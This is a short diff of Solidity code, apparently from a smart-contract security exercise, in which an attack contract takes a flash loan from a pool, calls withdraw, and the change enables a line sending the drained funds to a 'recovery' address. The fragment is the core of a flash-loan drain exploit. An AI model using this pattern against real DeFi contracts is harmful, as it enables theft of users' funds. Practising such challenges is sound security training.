@@ -19,7 +19,7 @@
         pool.flashLoan(amountToAttack);
         pool.withdraw();
 
-        // payable(recovery).transfer(amountToAttack);
+        payable(recovery).transfer(amountToAttack);
 
         // return true;
     }
